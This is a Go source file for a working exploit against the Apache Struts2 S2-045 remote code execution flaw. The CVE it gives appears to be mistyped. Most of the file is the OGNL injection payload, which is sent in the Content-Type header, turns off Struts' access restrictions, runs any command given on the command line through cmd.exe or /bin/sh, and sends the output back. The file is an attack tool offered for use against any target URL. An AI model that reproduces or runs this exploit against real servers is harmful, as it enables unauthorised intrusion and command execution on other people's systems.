package main

/*
    Apache Struts2 02-045 - Exploit Program

    CVE-2017-5368

*/

import (
    "flag"
    "fmt"
    "os"
    "net/http"
    "io/ioutil"
    "strings"
)

// This was removed from most exploits found in the web.
var exploit_packet = "%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

// This are the flags to process the input used in target exploitation
var target = flag.String("target", "", "Target to exploit.")
var command = flag.String("command", "", "Command to execute in the remote target.")

func doRequest(s string, p string) {
    client := &http.Client{}
    req, err := http.NewRequest("GET", s, nil)
    if err != nil {
        fmt.Printf("[!] Error: Could not craft the HTTP request.\n")
        os.Exit(1)
    }

    // The exploit works because of misbehave of the application
    // processing this header.
    req.Header.Set("Content-Type", p)

    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("[!] Error: Could not send the HTTP request.\n")
        os.Exit(1)
    }
    defer resp.Body.Close()
    body_bytes, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("[!] Error: Could not read the body content of HTTP request.\n")
        os.Exit(1)
    }
    var contents = string(body_bytes)
    var response_size = len(contents)
    fmt.Printf("[+] The response size was %d bytes.\n", response_size)
    fmt.Printf(contents) // dump the response to the attacker.
}

func usage() {
    fmt.Printf("For help: ./exploit -h\n")
    os.Exit(1)
}

func info(data string) {
    fmt.Printf("\033[093m[*]\033[0m: %s\n", data)
}

func main() {
    fmt.Printf("Apache Struts2 s2-045 exploit - CVE-2017-5368\n")
    flag.Parse()
    var url = fmt.Sprintf("Target set to: %s", *target)
    var rce = fmt.Sprintf("Command set to: %s", *command)
    info(url)
    info(rce)

    if *target == "" {
        usage()
    }
    if *command == "" {
        usage()
    }
    var exploit = strings.Replace(exploit_packet, "ifconfig", *command, -1)
    // Send the payload
    doRequest(*target, exploit)
    os.Exit(0)
}
